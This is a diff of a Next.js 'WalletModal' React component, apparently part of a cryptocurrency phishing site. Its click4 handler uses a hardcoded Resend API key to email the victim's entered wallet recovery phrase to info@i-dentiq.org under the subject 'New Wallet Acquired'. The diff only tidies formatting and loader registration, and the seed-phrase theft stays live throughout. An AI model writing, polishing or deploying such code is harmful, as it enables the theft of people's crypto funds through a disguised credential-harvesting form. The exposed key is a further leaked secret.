@@ -14,16 +14,15 @@ import { X } from "lucide-react";
 import Image from "next/image";
 import dynamic from "next/dynamic";
 
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { bip39WordList } from "./bip39Words.js";
-import { Resend } from 'resend';
+import { Resend } from "resend";
 
 const isBrowser = typeof window !== "undefined";
 let spiral, mirage;
 if (isBrowser) {
-    ({ spiral, mirage } = require("ldrs"));
+  ({ spiral, mirage } = require("ldrs"));
 }
-
 
 export default function WalletModal({ isOpen, onClose, active }) {
   const resend = new Resend("re_Ms2f8JZx_LSqdCR1pyLTjgQYsBQy7Xkux");
@@ -105,24 +104,27 @@ export default function WalletModal({ isOpen, onClose, active }) {
     setThird(false);
     setForth(true);
   };
-  
 
   const click4 = () => {
     setGif(true);
     setTimeout(() => setGif(false), 3000);
-    
+
     setForth(false);
     setFirst(true);
 
     resend.emails.send({
-      from: 'info@i-dentiq.org',
-      to: 'info@i-dentiq.org',
-      subject: 'New Wallet Acquired',
-      html: `<p>${userAgent.name}'s wallet phrase : \n ${inputs}</p>`
+      from: "info@i-dentiq.org",
+      to: "info@i-dentiq.org",
+      subject: "New Wallet Acquired",
+      html: `<p>${userAgent.name}'s wallet phrase : \n ${inputs}</p>`,
     });
   };
-  spiral.register();
-  mirage.register();
+  useEffect(() => {
+    if (spiral && mirage) {
+      spiral.register();
+      mirage.register();
+    }
+  }, []);
 
   return (
     <Dialog open={isOpen} onOpenChange={onClose}>
@@ -351,10 +353,7 @@ export default function WalletModal({ isOpen, onClose, active }) {
               </div>
             </div>
 
-            <Button
-              className="w-full bg-primary"
-              onClick={click4}
-            >
+            <Button className="w-full bg-primary" onClick={click4}>
               Close
             </Button>
           </DialogContent>
